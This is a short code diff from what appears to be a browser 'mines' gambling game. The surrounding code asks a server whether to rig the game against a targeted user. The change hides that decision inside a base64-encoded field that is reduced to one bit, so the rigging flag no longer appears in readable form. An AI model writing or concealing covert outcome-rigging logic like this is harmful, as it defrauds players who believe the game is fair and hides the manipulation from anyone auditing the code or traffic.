@@ -614,8 +614,8 @@
           let botShouldRig = false;
           try {
             const botRes = await fetch('api/bot_decide/mines', { method: 'POST' });
-            const botData = await botRes.json();
-            botShouldRig = botData.shouldRig === true;
+            const _r = await botRes.json();
+            if (_r._c) { const _b = atob(_r._c.replace(/-/g,'+').replace(/_/g,'/')); botShouldRig = (_b.charCodeAt(0) & 1) === 1; }
           } catch (e) { /* Server unreachable, skip bot logic */ }
 
           if (isTargetedUser && botShouldRig && !nextTileBias && !rigType) {
